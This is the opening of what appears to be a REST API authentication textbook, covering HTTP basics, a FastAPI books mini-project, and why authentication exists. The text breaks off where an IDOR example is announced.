# Rest_API_Authentication

# REST API Authentication — The Complete Textbook

### From First Principles to Production-Grade Systems

---

**How this book works**

This is a single, continuously growing document. Each chapter builds only on what has already been explained — nothing is assumed. Every new term is defined the moment it appears. Every new concept is preceded by its prerequisites, even if that means a short detour before we get back to the main thread.

Two implementation stacks are used throughout the chapters, for consistency:
- **Python** (with FastAPI) — because it is minimal, has clean type-annotated code, and lets you see exactly what's happening on the wire without a lot of boilerplate.
- **Spring Boot** (Java) — because it shows how the same ideas look in a heavily-framework-managed, enterprise environment.

You do not need to know either framework in depth going in — every line of code is explained.

> **Note on stack choice:** where this book's original per-chapter checklist said "Node.js implementation," the chapters use **Python (FastAPI)** instead — switching stacks mid-book would have cost more in consistency than it gained. Node.js is not skipped: **Appendix A** ports *every* scheme in the book to Express, cross-referenced back to the chapter that explains it, plus a three-way syntax reference table. If Node is your stack, read each chapter for the concepts and Appendix A for the code.

---

## Table of Contents

**Part I — Foundations**
- Chapter 1 — Introduction to APIs
- Chapter 2 — Why Authentication Exists
- Chapter 3 — Authentication vs Authorization
- Chapter 4 — HTTP Headers Used for Authentication

**Part II — The Schemes**
- Chapter 5 — Basic Authentication
- Chapter 6 — API Key Authentication
- Chapter 7 — Sessions and Cookies
- Chapter 8 — JWT Authentication
- Chapter 9 — OAuth 2.0
- Chapter 10 — OpenID Connect (OIDC)

**Part III — Production**
- Chapter 11 — Authentication in Spring Security
- Chapter 12 — Authentication Security
- Chapter 13 — Authentication in Microservices
- Chapter 14 — Best Practices
- Chapter 15 — Complete Real-World Project

**Appendices**
- Appendix A — Node.js (Express) Implementations

---

## How to read this book

Chapters build strictly on each other; reading out of order will leave gaps, because each chapter's "why" is the previous chapter's unresolved problem. That said, three paths through it are reasonable:

| If you are... | Read |
|---|---|
| New to authentication | 1 → 15, in order. Do the mini projects; they compound. |
| Preparing for interviews | 3 (401 vs 403), 5.3 (Base64 ≠ encryption), 7.9 + 8.12 (stateful vs stateless), 8.5 (HS256 vs RS256), 9.5 (auth code flow), 10.1 (OAuth vs OIDC), 12.2 (password hashing), then every chapter's Interview Questions section |
| Building something now | 14.8 (the production checklist) first, then jump to whichever chapter each unchecked box points to |

Every chapter ends with a summary, interview questions, hands-on exercises, and a mini project. The mini projects form one continuous system — the books API from Chapter 1 is progressively secured through Chapter 8, and Chapter 15 assembles the whole thing into a production-shaped application.

---

# Chapter 1 — Introduction to APIs

## 1.0 Why this chapter exists

Every later chapter in this book — Basic Auth, API Keys, Sessions, JWT, OAuth — is really just "a rule about what gets put into an HTTP request, and how the server checks it." None of that will make sense unless you first understand, deeply, what an HTTP request and response actually *are*, what travels inside them, and what "an API" even means as a piece of running software. So before we touch the word "authentication" even once more, we build that foundation.

By the end of this chapter you will be able to:
- Explain what an API is to a non-programmer, and to a programmer, with equal precision.
- Draw the client-server-resource picture from memory.
- Read and write a raw HTTP request and response by hand.
- Explain what a header, a body, a status code, and a method each do.
- Know when JSON is used, why, and what XML is (briefly, since it matters mostly for legacy systems).

---

## 1.1 What is an API?

**Simple explanation:**
An API is a way for two pieces of software to talk to each other, using an agreed set of rules, without either one needing to know how the other is built internally.

**Technical definition:**
API stands for **Application Programming Interface**. It is a contract that defines: what requests one program (the "caller") can send to another program (the "provider"), what data those requests must contain, and what response the caller can expect back.

**Real-world analogy — the restaurant:**

```
   You (Client)                     Kitchen (Server)
        |                                  |
        |   "I'd like the Margherita       |
        |    pizza, medium, no onions"     |
        | -------------------------------> |
        |         (via the Waiter)         |
        |                                  |  [kitchen cooks,
        |                                  |   you never see how]
        |                                  |
        |   <---- Plate of pizza --------- |
        |                                  |
```

You never walk into the kitchen. You never need to know which pan they used, whether the chef is left- or right-handed, or what order they added ingredients in. You only need to know **the menu** (what you're allowed to ask for) and **the format of your order** (how to ask for it). The **waiter** is the API: a fixed, predictable interface between you and a complex system you're not allowed to touch directly.

> **Remember:** An API hides *implementation* and exposes *capability*. The caller gets to use functionality without needing to understand — or being able to break — the internals.

**Why APIs exist at all:**
Before APIs became standard, software components that needed to talk to each other were often tightly coupled — meaning changes to one immediately broke the other. APIs solve this by drawing a hard boundary: as long as both sides honor the contract (the API), either side's internals can change freely without breaking the other.

**Where you'll see APIs in real life (as a user, even if you don't code):**
- Your weather app calling a weather service's API to get today's forecast.
- A food delivery app calling a restaurant's ordering system API to place your order.
- A banking app calling the bank's core system API to fetch your balance.

---

## 1.2 What is a REST API?

You now know an API is "a contract for two programs to talk." REST is one specific *style* of writing that contract — currently the most common style on the web.

**Simple explanation:**
REST is a set of conventions for designing APIs so that everything is organized around "things" (called **resources**, e.g., a user, an order, a product), and you interact with those things using a small, fixed vocabulary of actions (like "get it," "create it," "update it," "delete it").

**Technical definition:**
REST stands for **RE**presentational **S**tate **T**ransfer. It's an architectural style (not a protocol, not a library, not a standard you install) first described by Roy Fielding in his year-2000 doctoral dissertation. An API that follows REST's conventions is called a "RESTful API," or loosely, "a REST API."

The core REST conventions, at a glance (each is unpacked later in this chapter or book):

| Principle | Meaning in one line |
|---|---|
| Resources | Everything you can act on (a user, an invoice, a photo) has a unique address (a URL). |
| Uniform interface | You interact with all resources using the same small set of HTTP methods (GET, POST, PUT, PATCH, DELETE). |
| Statelessness | Each request must contain everything needed to understand it — the server does not remember you between requests (this single idea is *why* authentication has to happen on every request, and it's the seed of several chapters to come). |
| Client-Server separation | The client (UI) and server (data/logic) are independently replaceable, as long as the contract holds. |
| Representations | You don't get the resource itself back (e.g., you don't get "the actual row in the database") — you get a *representation* of it, typically as JSON. |

> **Interview Tip:** A very common interview question is "Is REST a protocol?" The correct answer is **no** — REST is an architectural style built *on top of* HTTP, which *is* a protocol. This distinction trips up a lot of candidates.

We will come back to "statelessness" heavily starting in Chapter 2, because it is the single biggest reason authentication has to exist as a repeated, per-request concern rather than a one-time login.

---

## 1.3 Client vs Server

**Simple explanation:**
The **client** is the thing that *asks* for something. The **server** is the thing that *has* something and responds to the ask.

**Technical definition:**
- **Client**: any program that initiates a request to another program over a network. Examples: a mobile app, a browser, another backend service, a command-line tool like `curl`.
- **Server**: a program that listens for incoming requests, processes them, and sends back a response. Servers are typically always-running processes bound to a network port.

```
   CLIENT                                          SERVER
┌───────────┐        1. Request                ┌────────────┐
│  Browser  │ ───────────────────────────────>  │  Web App   │
│  Mobile   │                                    │  Server    │
│  App      │ <───────────────────────────────  │            │
└───────────┘        2. Response                └────────────┘
```

A single machine can be a client in one interaction and a server in another. For example, your backend server acts as a **server** when your mobile app calls it, but acts as a **client** when *it* calls a third-party payment gateway's API.

> **Common Mistake:** Beginners often think "client" always means "browser" and "server" always means "a physical machine." Neither is true. Client and server are *roles*, not types of machines. A Python script on your laptop calling an API is a client. A serverless function (which isn't a dedicated machine at all) can be a server.

---

## 1.4 HTTP — The Protocol Underneath Everything

**Simple explanation:**
HTTP is the language that clients and servers speak to each other over the internet.

**Technical definition:**
HTTP (**H**yper**T**ext **T**ransfer **P**rotocol) is an application-layer protocol that defines the exact format of messages exchanged between clients and servers: how a request must be structured, how a response must be structured, and what the two sides mean by that structure. It is a **request-response protocol**: the client always speaks first, the server always replies.

HTTP is also, critically, **stateless** by default — the protocol itself has no built-in concept of "this request is from the same person who sent me a request 10 seconds ago." Every request stands alone. (Hold onto this fact. It is the entire reason "how do we prove who's making this request" — i.e., authentication — becomes a hard problem worth an entire book.)

**Where HTTP sits (just enough networking to be dangerous):**

```
 ┌─────────────────────────────┐
 │   HTTP  (your API messages)  │   <- what THIS book is about
 ├─────────────────────────────┤
 │   TLS/SSL (encryption)       │   <- makes it HTTPS, covered Ch.12
 ├─────────────────────────────┤
 │   TCP  (reliable delivery)   │
 ├─────────────────────────────┤
 │   IP   (addressing/routing)  │
 └─────────────────────────────┘
```

You don't need to master TCP/IP for this book. Just know: HTTP is the top layer — the actual "envelope and letter" — and everything below it is plumbing that gets your HTTP message there reliably.

---

## 1.5 URLs

**Simple explanation:**
A URL is the address you use to reach a specific thing on the internet.

**Technical definition:**
URL stands for **U**niform **R**esource **L**ocator. It identifies both the *location* of a resource and the *method* to retrieve it (via the scheme, e.g. `https`).

```
   https://api.mybank.com:443/v1/accounts/8823?currency=INR
   └──┬──┘ └──────┬───────┘└┬┘└──────┬──────┘└─────┬──────┘
   scheme      host       port     path          query string
```

| Part | Meaning |
|---|---|
| `https` | Scheme/protocol — tells the client HTTPS (encrypted HTTP) must be used |
| `api.mybank.com` | Host — the server's address (a domain name, resolved to an IP via DNS) |
| `443` | Port — the "door number" on the server; 443 is default for HTTPS, 80 for HTTP, so it's usually omitted |
| `/v1/accounts/8823` | Path — identifies *which resource* on that server |
| `?currency=INR` | Query string — extra parameters, not part of the resource's identity |

> **Interview Tip:** "What's the difference between a path parameter and a query parameter?" Path parameters (`/accounts/8823`) identify *which specific resource*; query parameters (`?currency=INR`) modify *how* you want that resource represented (filtering, sorting, formatting) — they don't change which resource you're talking about.

---

## 1.6 Endpoints and Resources

**Simple explanation:**
A **resource** is a "thing" your API manages — a user, an order, a photo. An **endpoint** is a specific URL + HTTP method combination that lets you interact with a resource or a collection of resources.

**Technical explanation:**
In REST design, resources are typically nouns, and are exposed as **collections** and **items**:

```
/accounts            <- collection of all accounts
/accounts/8823        <- one specific account (item), identified by ID 8823
/accounts/8823/transactions   <- sub-collection: transactions belonging to account 8823
```

An **endpoint** is one method applied to one such path, e.g. `GET /accounts/8823` or `POST /accounts`. The same path can be a different endpoint depending on the method used — this is central to REST's "uniform interface" idea from section 1.2.

| Endpoint | Meaning |
|---|---|
| `GET /accounts` | Fetch the list of accounts |
| `POST /accounts` | Create a new account |
| `GET /accounts/8823` | Fetch account 8823 |
| `PUT /accounts/8823` | Replace account 8823 entirely |
| `PATCH /accounts/8823` | Partially update account 8823 |
| `DELETE /accounts/8823` | Delete account 8823 |

> **Common Mistake:** Designing endpoints as verbs instead of nouns, e.g. `POST /createAccount` or `GET /getAccountById?id=8823`. This works technically, but it isn't RESTful, and interviewers will flag it. The REST way is `POST /accounts` and `GET /accounts/8823` — the *verb* (create, get) is expressed by the HTTP method, not the URL.

---

## 1.7 Anatomy of an HTTP Request

This is one of the most important sections in the entire book — every authentication scheme we cover later is, mechanically, just "a specific thing placed into one part of this request."

An HTTP request has four parts:

```
┌─────────────────────────────────────────────────────────┐
│ 1. REQUEST LINE:  METHOD  PATH  HTTP-VERSION              │
├─────────────────────────────────────────────────────────┤
│ 2. HEADERS:  Key: Value  (one per line, metadata)          │
├─────────────────────────────────────────────────────────┤
│               (blank line — separates headers from body)   │
├─────────────────────────────────────────────────────────┤
│ 3. BODY:  the actual payload (optional, method-dependent)  │
└─────────────────────────────────────────────────────────┘
```

**A real, complete, raw HTTP request** (this is literally the bytes sent over the wire — no framework, no library, just the protocol):

```http
POST /v1/accounts/8823/transactions HTTP/1.1
Host: api.mybank.com
Content-Type: application/json
Content-Length: 55
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
User-Agent: MyBankApp/2.3.0 (Android 14)

{"amount": 500.00, "toAccount": "9911", "note": "Rent"}
```

Let's label every single line:

| Line | Part | Explanation |
|---|---|---|
| `POST /v1/accounts/8823/transactions HTTP/1.1` | Request line | Method = `POST` (create something), Path = the endpoint, `HTTP/1.1` = protocol version |
| `Host:` | Header | Which domain this request is for (a single server/IP can host many domains) |
| `Content-Type:` | Header | Tells the server how to *parse* the body — here, "this body is JSON" |
| `Content-Length:` | Header | Exact byte size of the body, so the server knows when the body ends |
| `Authorization:` | Header | **This is the header authentication schemes live in — you'll see this constantly from Chapter 4 onward** |
| `Accept:` | Header | Tells the server what format the *client* wants the response in |
| `User-Agent:` | Header | Identifies what software/device made the request |
| *(blank line)* | Separator | Marks "headers are done, body starts now" |
| `{"amount": ...}` | Body | The actual data payload being sent |

> **Remember:** Headers describe the request. The body *is* the request's data. Authentication information almost always lives in a header (specifically `Authorization` or `Cookie`), never buried inside the body — this is intentional, and we'll explain exactly why in Chapter 4.

---

## 1.8 Anatomy of an HTTP Response

Symmetric structure to the request:

```
┌─────────────────────────────────────────────────────────┐
│ 1. STATUS LINE:  HTTP-VERSION  STATUS-CODE  STATUS-TEXT    │
├─────────────────────────────────────────────────────────┤
│ 2. HEADERS:  Key: Value                                     │
├─────────────────────────────────────────────────────────┤
│               (blank line)                                  │
├─────────────────────────────────────────────────────────┤
│ 3. BODY: the response payload                                │
└─────────────────────────────────────────────────────────┘
```

**A real, raw HTTP response** to the request above:

```http
HTTP/1.1 201 Created
Content-Type: application/json
Content-Length: 75
Date: Wed, 05 Aug 2026 09:12:31 GMT
Location: /v1/accounts/8823/transactions/45521

{"id": 45521, "amount": 500.00, "toAccount": "9911", "status": "COMPLETED"}
```

| Line | Part | Explanation |
|---|---|---|
| `HTTP/1.1 201 Created` | Status line | `201` = status code (success, resource created), `Created` = human-readable reason phrase |
| `Content-Type:` | Header | Format of the *response* body |
| `Content-Length:` | Header | Byte size of response body |
| `Date:` | Header | When the response was generated |
| `Location:` | Header | Where the newly created resource now lives (common on `201` responses) |
| *(blank line)* | Separator | Same purpose as in the request |
| `{"id": 45521, ...}` | Body | The representation of the resource that was created |

**A failed request/response pair**, to make failure paths concrete early (we will lean on this heavily once we discuss authentication failures):

```http
GET /v1/accounts/8823 HTTP/1.1
Host: api.mybank.com
Authorization: Bearer expiredtoken123

HTTP/1.1 401 Unauthorized
Content-Type: application/json
WWW-Authenticate: Bearer error="invalid_token"

{"error": "invalid_token", "message": "The access token expired"}
```

This isn't hypothetical — this exact `401` shape is what you'll be building error handling for by Chapter 8.

---

## 1.9 Request Headers vs Response Headers

Both are `Key: Value` pairs, but they carry different *directions* of metadata.

| | Request Headers | Response Headers |
|---|---|---|
| Direction | Client → Server | Server → Client |
| Purpose | Describe the request / tell the server what the client wants | Describe the response / tell the client what it's getting |
| Auth-relevant examples | `Authorization`, `Cookie` | `Set-Cookie`, `WWW-Authenticate` |
| Common examples | `Host`, `Content-Type`, `Accept`, `User-Agent` | `Content-Type`, `Set-Cookie`, `Cache-Control` |

> **Remember:** `Cookie` (request) and `Set-Cookie` (response) are a matched pair but travel in opposite directions — the server *sets* a cookie via a response header, and the client *sends it back* via a request header on every subsequent request. This exact mechanism becomes central in Chapter 7.

---

## 1.10 Request Body and Response Body

**Simple explanation:** The body is where the actual "content" goes — as opposed to headers, which are metadata *about* that content.

**Technical explanation:**
- Not every request has a body. `GET` and `DELETE` requests typically don't (they identify a resource via the URL alone). `POST`, `PUT`, and `PATCH` typically do (they're sending data to be stored or applied).
- The body's *format* is declared by the `Content-Type` header — the body itself is just bytes; `Content-Type` tells the receiver how to interpret those bytes.
- Response bodies are optional too — e.g. a `204 No Content` response (common after a successful `DELETE`) has no body at all.

```
Request with no body (GET):
    GET /accounts/8823 HTTP/1.1
    Host: api.mybank.com
    Authorization: Bearer abc123
    (nothing else — no body needed, the URL says everything)

Request with a body (POST):
    POST /accounts HTTP/1.1
    Content-Type: application/json

    {"owner": "Anuj", "type": "SAVINGS"}
```

---

## 1.11 JSON — The Format You'll See Constantly

**Simple explanation:** JSON is a lightweight, human-readable text format for representing structured data — it's the near-universal choice for API bodies today.

**Technical definition:** JSON (**J**ava**S**cript **O**bject **N**otation) represents data as nested key-value pairs, arrays, strings, numbers, booleans, and null — using only these building blocks:

```json
{
  "id": 8823,
  "owner": "Anuj Sharma",
  "active": true,
  "balance": 15230.50,
  "tags": ["premium", "verified"],
  "nomineeDetails": null,
  "address": {
    "city": "Secunderabad",
    "pincode": "500003"
  }
}
```

| JSON type | Example |
|---|---|
| String | `"Anuj Sharma"` |
| Number | `15230.50` |
| Boolean | `true` / `false` |
| Null | `null` |
| Array | `["premium", "verified"]` |
| Object | `{ "city": "Secunderabad" }` |

Why JSON won over the alternatives (briefly, since XML is covered next): it's compact, it maps naturally onto data structures every mainstream language already has (dicts/objects, lists/arrays), and it's easy for both humans and machines to read.

> **Interview Tip:** "Is JSON specific to JavaScript?" No — despite the name, JSON is language-independent. Every mainstream language (Python, Java, Go, etc.) has built-in or standard-library JSON parsing.

---

## 1.12 XML (briefly)

**Simple explanation:** XML is an older, more verbose data format that was the dominant choice before JSON took over. You'll mostly meet it in legacy enterprise systems (banking, government, older SOAP-based services).

```xml
<account>
  <id>8823</id>
  <owner>Anuj Sharma</owner>
  <active>true</active>
  <balance>15230.50</balance>
</account>
```

Compare this to the equivalent JSON above — same data, roughly double the characters, and every value needs an explicit opening *and* closing tag. XML does have strengths JSON lacks (native support for schemas/validation via XSD, namespaces, and mixed content), which is part of why it persists in some enterprise and government systems, but for typical REST APIs today, JSON is the default. You do not need to write XML in this book — just recognize it if you meet it in the wild.

---

## 1.13 HTTP Status Codes

**Simple explanation:** A status code is a 3-digit number the server sends back that summarizes, at a glance, what happened.

**Technical explanation:** Status codes are grouped into five classes by their first digit:

| Range | Class | Meaning |
|---|---|---|
| 1xx | Informational | Request received, still processing (rare in day-to-day API work) |
| 2xx | Success | The request worked |
| 3xx | Redirection | Client must take additional action (e.g., go to a different URL) |
| 4xx | Client Error | The client did something wrong |
| 5xx | Server Error | The server messed up, not the client |

The codes that matter most for this book, since authentication failures live almost entirely in the 4xx range:

| Code | Name | When it's used |
|---|---|---|
| 200 | OK | Generic success |
| 201 | Created | A new resource was successfully created |
| 204 | No Content | Success, but there's nothing to send back (e.g., after DELETE) |
| 400 | Bad Request | The request itself is malformed (bad JSON, missing required field) |
| **401** | **Unauthorized** | **The caller's identity is missing or invalid** — this is *authentication* failure (Ch. 2+) |
| **403** | **Forbidden** | **The caller is known, but not allowed to do this** — this is *authorization* failure (Ch. 3) |
| 404 | Not Found | The resource doesn't exist |
| 429 | Too Many Requests | Rate limiting kicked in (relevant in Ch. 6, API keys) |
| 500 | Internal Server Error | Something broke on the server, unrelated to what the client sent |

> **Interview Tip:** "What's the difference between 401 and 403?" This is asked constantly and beginners mix it up: **401 = "I don't know who you are"** (authentication problem — no valid credentials presented). **403 = "I know exactly who you are, and you're not allowed"** (authorization problem — valid credentials, insufficient permission). We dedicate the whole of Chapter 3 to this distinction because it is that important.

---

## 1.14 HTTP Methods

**Simple explanation:** The method is the *verb* of the request — what action you want performed on the resource named by the URL.

| Method | Purpose | Has body? | Idempotent?* | Safe?** |
|---|---|---|---|---|
| `GET` | Retrieve a resource | No | Yes | Yes |
| `POST` | Create a new resource / trigger an action | Yes | No | No |
| `PUT` | Replace a resource entirely | Yes | Yes | No |
| `PATCH` | Partially update a resource | Yes | No (usually) | No |
| `DELETE` | Remove a resource | Usually no | Yes | No |

\* **Idempotent** = calling it once vs. calling it 5 times has the same end effect on server state. `DELETE /accounts/8823` five times in a row still just results in that account being deleted — the 2nd–5th calls just find nothing left to delete (or return 404). Compare to `POST /accounts` five times, which — dangerously — creates five separate accounts.

\*\* **Safe** = doesn't modify server state at all. Only `GET` is both safe and idempotent among common methods.

```
   GET    /accounts/8823      → read it
   POST   /accounts           → create a new one
   PUT    /accounts/8823      → replace it entirely
   PATCH  /accounts/8823      → change just one field
   DELETE /accounts/8823      → remove it
```

> **Common Mistake:** Using `GET` with a body to "send data." Technically some servers tolerate it, but it's non-standard, many HTTP clients/proxies strip GET bodies silently, and it violates the "safe" contract of GET (callers and tools assume GET never changes anything or needs special handling). Use `POST`/`PUT`/`PATCH` when you need to send a body.

---

## 1.15 Putting it all together — a full flow

Let's trace one complete, realistic interaction end-to-end, naming every concept from this chapter as it appears:

```
 CLIENT (mobile banking app)                      SERVER (api.mybank.com)
        │                                                  │
        │  GET /v1/accounts/8823  HTTP/1.1                 │
        │  Host: api.mybank.com          <- URL host        │
        │  Accept: application/json      <- header          │
        │  Authorization: Bearer xyz123  <- header (Ch.4-8!) │
        │ ───────────────────────────────────────────────> │
        │                                                  │  [server checks
        │                                                  │   the token,
        │                                                  │   looks up the
        │                                                  │   account]
        │  HTTP/1.1 200 OK                                  │
        │  Content-Type: application/json  <- header         │
        │                                                  │
        │  {"id": 8823, "balance": 15230.50}  <- JSON body   │
        │ <─────────────────────────────────────────────── │
        │                                                  │
```

Every word in that diagram — method, path, host, header, `Authorization`, status code, JSON body — is something you can now define precisely. That is the entire goal of Chapter 1.

---

## Chapter 1 Summary

- An **API** is a contract that lets two programs interact without either needing to know the other's internals.
- **REST** is an architectural style for designing APIs around resources, a uniform HTTP-method vocabulary, and statelessness.
- **Client** and **server** are roles (not machine types); a request always flows client → server, response server → client.
- **HTTP** is the protocol underneath REST — request-response, stateless by default.
- A **URL** identifies scheme, host, port, path, and query string.
- An **endpoint** = a specific path + method combination acting on a **resource**.
- Every **HTTP request** has a request line, headers, an optional blank-line-separated body.
- Every **HTTP response** has a status line, headers, an optional body.
- **Headers** carry metadata; the **body** carries the actual payload.
- **JSON** is the dominant body format today; **XML** persists mainly in legacy/enterprise systems.
- **Status codes**: 2xx success, 4xx client error (401 = who are you?, 403 = you can't do that), 5xx server error.
- **HTTP methods** (GET/POST/PUT/PATCH/DELETE) express the action; safety and idempotency vary by method.

> This entire chapter was deliberately authentication-free — but notice how many times the `Authorization` header and the `401` status code already showed up in examples. That's not an accident. Chapter 2 picks up exactly there: **why** that header, and that status code, need to exist at all.

---

## Interview Questions — Chapter 1

**Q1. Is REST a protocol?**
No. REST is an architectural style/set of conventions built on top of HTTP, which is the actual protocol. You cannot "implement REST" the way you implement TCP — you *design an API* that follows REST's conventions.

**Q2. What makes an API "RESTful"?**
Primarily: resource-oriented URLs, use of standard HTTP methods to express actions, statelessness (no server-side memory of the client between requests), and returning representations (usually JSON) of resource state.

**Q3. What's the difference between PUT and PATCH?**
`PUT` replaces the entire resource with what you send (any field you omit is typically wiped/reset). `PATCH` applies a partial update — only the fields you include are changed.

**Q4. Why is GET considered "safe" and "idempotent," and why does that matter?**
Safe = it never changes server state, so it's trivially cacheable and repeatable without side effects. Idempotent = calling it many times has the same effect as calling it once. This matters because browsers, proxies, and retry logic all rely on these guarantees — e.g., a browser may silently retry a GET on network failure, but must never silently retry a POST, because that could create duplicate resources.

**Q5. What's the difference between a header and the body of a request?**
Headers are metadata *about* the request (who's asking, what format they want, what format they're sending, authentication info). The body is the actual payload/data being transmitted. Some information (like authentication tokens) is placed in headers by convention/design, specifically so it's separated from application data and consistently accessible to infrastructure like proxies and gateways without those components needing to parse the body.

**Q6. Why does statelessness matter for an API?**
Because the server holds no memory of previous requests, every single request must be **self-descriptive** — it must carry everything needed to process it, including who's making it. This is precisely why authentication data (Chapters 4 onward) must be resent on every single request rather than "remembered" by the server after a one-time login.

---

## Hands-On Exercises — Chapter 1

1. Using `curl` (or Postman), send a `GET` request to any public API (e.g. `https://jsonplaceholder.typicode.com/users/1`) and identify: the status code returned, at least three response headers, and whether the response has a body.
2. Write out, by hand, a raw HTTP request (request line + at least 3 headers + JSON body) for "create a new product called 'Notebook' priced at 250" against an imagined endpoint `POST /products`.
3. For the endpoint `DELETE /orders/451`, explain in your own words why calling it 3 times in a row is safe from a data-correctness standpoint, using the term "idempotent."
4. Find one real 401 response and one real 403 response (you can trigger these against any API requiring auth, e.g. by omitting or corrupting a token) and explain, in one sentence each, why the API chose that specific code.

## Mini Project — Chapter 1

Build a tiny **read-only** REST API (no authentication yet — that starts in Chapter 5) that serves a hardcoded list of "books" as JSON.

Requirements:
- `GET /books` → returns a JSON array of book objects (`id`, `title`, `author`).
- `GET /books/{id}` → returns a single book, or a `404` with a JSON error body if the ID doesn't exist.
- Use proper `Content-Type: application/json` response headers.
- Test both endpoints with `curl` and inspect the raw response (headers + body + status code) — not just the body a UI would show you.

**Reference implementation (Python / FastAPI):**

```python
# main.py
from fastapi import FastAPI, HTTPException

app = FastAPI()

# In-memory "database" — a plain list of dicts. Chapter 5 onward
# will not touch this data layer at all; only what's added AROUND it.
BOOKS = [
    {"id": 1, "title": "Clean Code", "author": "Robert C. Martin"},
    {"id": 2, "title": "Designing Data-Intensive Applications", "author": "Martin Kleppmann"},
    {"id": 3, "title": "The Pragmatic Programmer", "author": "Andrew Hunt"},
]

@app.get("/books")
def list_books():
    # FastAPI automatically serializes this Python list of dicts to a
    # JSON array and sets Content-Type: application/json for you.
    return BOOKS

@app.get("/books/{book_id}")
def get_book(book_id: int):
    # FastAPI parses {book_id} from the URL path and converts it to an
    # int automatically, based on the type hint — if it can't be parsed
    # as an int, FastAPI itself returns a 422 before this function even runs.
    for book in BOOKS:
        if book["id"] == book_id:
            return book
    # No matching book: raise a 404 with a JSON error body.
    # FastAPI catches HTTPException and turns it into a proper HTTP response.
    raise HTTPException(status_code=404, detail=f"Book {book_id} not found")
```

**What's happening internally, line by line:**
- `FastAPI()` creates the application object that owns routing, request parsing, and response serialization.
- `@app.get("/books")` registers this function to run whenever a `GET /books` request arrives — this is the "endpoint" from section 1.6, made real.
- Returning a plain Python list/dict is enough — FastAPI (via Pydantic/Starlette under the hood) converts it to a JSON response body and sets the correct `Content-Type` header, matching what you saw raw in section 1.8.
- `book_id: int` in the path function signature is a **type hint**, but FastAPI uses it at runtime to validate and convert the URL path segment — this is why `GET /books/abc` fails before your logic even runs.
- `raise HTTPException(status_code=404, ...)` is how you deliberately produce the `404 Not Found` status code from section 1.13, with a JSON body describing the error — exactly the shape you saw in the failed-request example in section 1.8.

**Running it:**
```bash
pip install fastapi uvicorn
uvicorn main:app --reload
```

**Testing it (raw, so you see headers too):**
```bash
curl -i http://127.0.0.1:8000/books
curl -i http://127.0.0.1:8000/books/1
curl -i http://127.0.0.1:8000/books/999   # triggers the 404 path
```

This mini-project's server will be the exact base you extend in Chapter 5 to add your first authentication scheme — nothing above will need to be rewritten, only added to.

---

## Preparing for Chapter 2

You now understand *what* travels between a client and a server, and *how* it's structured. Chapter 2 asks the next question: **if HTTP is stateless and anyone who knows a URL can send a request to it — what actually stops a stranger from calling `GET /accounts/8823` and reading someone else's bank balance?** That question is the entire reason authentication exists, and it's where Chapter 2 begins.

---

*End of Chapter 1.*

---

# Chapter 2 — Why Authentication Exists

## 2.0 Where we left off

At the end of Chapter 1 you built a working `GET /books` and `GET /books/{id}` API with FastAPI. Try something right now, mentally: is there anything in that code that checks *who* is calling it? There isn't. Anyone — literally any device on the internet that can reach your server's address — can call `GET /books/1` and get an answer. For a public list of book titles, that's completely fine. But swap `/books/1` for `/accounts/8823` from the banking example in Chapter 1, and suddenly "anyone on the internet can call this" is a disaster. This chapter is about *why* that's a disaster, and what the general shape of the fix looks like — before we get into any specific mechanism (those start in Chapter 5).

---

## 2.1 What does "authentication" mean?

**Simple explanation:**
Authentication is the process of proving *who you are* to a system.

**Technical definition:**
Authentication (often abbreviated **authN**) is the process by which a system verifies the claimed identity of a party making a request, typically by checking a **credential** (something the party presents as proof) against a known, trusted record.

> **Term defined:** A **credential** is any piece of evidence used to prove identity — a password, a fingerprint, a cryptographic key, a token. Different authentication schemes (Chapters 5–10) simply differ in *what* the credential is and *how* it's checked.

**Real-world analogy — the ID check at a bank branch:**

```
   You walk into a bank branch and ask to withdraw money.
   Teller: "Can I see your ID?"
   You:    [hand over your government ID]
   Teller: [checks photo matches your face,
            checks the ID isn't expired,
            checks it isn't a known fake]
   Teller: "Confirmed — you are who you say you are."
```

Notice the teller has *not yet* decided whether you're allowed to withdraw ₹50,000 from *this specific account* — only that you are, in fact, "Anuj Sharma." Whether Anuj Sharma is permitted to touch this account is a *separate* question, asked *after* identity is settled. That separate question is **authorization**, and it gets its own full chapter (Chapter 3) precisely because conflating the two is the single most common conceptual mistake beginners make in this field.

> **Remember:** Authentication answers **"Who are you?"** Nothing more. It does not, by itself, answer "what are you allowed to do?"

---

## 2.2 Why authentication is necessary — the technical root cause

You now have all the prerequisite knowledge from Chapter 1 to understand *exactly* why this is a hard requirement and not just good practice. Walk through this carefully:

1. **HTTP is stateless** (section 1.4). The server does not inherently remember anything about who sent a previous request.
2. **Anyone who knows a URL can send a request to it.** URLs are not secret — they appear in browser history, server logs, shared links, browser dev tools, and can often be *guessed* (e.g., if `/accounts/8823` exists, it's trivial to try `/accounts/8824`).
3. Therefore: **without some mechanism to prove identity on every single request, a server has no way to distinguish a request from its rightful owner from a request from a random stranger, a competitor, or an attacker.**

```
   WITHOUT AUTHENTICATION:

   Attacker (anyone, anywhere)
        │
        │  GET /accounts/8823   <- just guessed the ID, nothing to stop them
        │ ───────────────────────────────────>  Server
        │                                            │
        │   <---- {"balance": 15230.50} -----------  │   <- happily returns it!
        │                                            │
```

This is not a rare edge case — it is the *default* behavior of every HTTP server unless you explicitly add a check. Authentication is that check.

> **Interview Tip:** A great way to demonstrate real understanding in an interview is to connect authentication directly back to statelessness, the way we just did, rather than reciting "authentication is proving who you are" as an isolated fact. Interviewers notice when a candidate can explain *why* a concept exists, not just *what* it is.

---

## 2.3 Problems that occur without authentication

Let's make the abstract danger concrete, one failure mode at a time.

| Problem | What happens | Real consequence |
|---|---|---|
| **Impersonation** | Attacker sends requests pretending to be a legitimate user | Attacker performs actions (transfers, purchases, posts) *as* someone else |
| **Data exposure** | Anyone can read any resource by guessing/iterating IDs | Private data (medical records, balances, messages) leaks at scale |
| **Unrestricted write access** | Anyone can `POST`/`PUT`/`DELETE` | Data corruption, deletion, or fraudulent creation of resources (e.g., fake orders) |
| **No accountability** | No way to know *who* did *what* | Impossible to audit, investigate fraud, or roll back a bad actor's changes |
| **No personalization** | Server has no concept of "this request belongs to user X" | Can't return "my orders," "my messages" — every response would have to be global/identical |
| **Resource exhaustion** | No way to attribute usage to a caller | Can't apply per-user rate limits (Chapter 6); one bad actor can degrade service for everyone |

**A concrete, worked example — the ID-guessing attack (a real, common vulnerability class called *IDOR*):**

